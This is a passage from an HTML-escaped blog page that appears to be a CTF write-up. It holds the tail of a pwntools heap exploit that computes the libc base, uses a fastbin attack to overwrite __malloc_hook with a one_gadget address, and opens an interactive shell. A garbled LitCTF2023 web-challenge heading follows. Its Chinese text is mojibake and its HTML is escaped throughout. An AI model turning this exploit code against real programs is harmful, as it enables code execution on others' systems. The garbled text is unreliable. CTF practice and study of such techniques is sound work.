n&#34;&gt;hex&lt;/span&gt;(__malloc_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = __malloc_hook - libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__malloc_hook&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = libcbase + &lt;span class=&#34;number&#34;&gt;0xf1247&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, p64(__malloc_hook - &lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x13&lt;/span&gt; + p64(onegadget))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

 &lt;h1 id=&#34;litctf2023тцЇуј░&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#litctf2023тцЇуј░&#34;&gt;#&lt;/a&gt; LitCTF2023№╝ѕтцЇуј░№╝Ѕ&lt;/h1&gt;
&lt;h1 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; Web№╝џ&lt;/h1&gt;
&lt;h2 id=&#34;1-ТѕЉflagтЉб&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-ТѕЉflagтЉб&#34;&gt;#&lt;/a&gt; 1сђЂТѕЉ Flag тЉб№╝Ъ&lt;/h2&gt;
&lt;p&gt;РђІ	ctrl+u У»╗тЈќТ║љуаЂ№╝їтюеТюђтљјтЈЉуј░С║є flag№╝џ&lt;/p&gt;
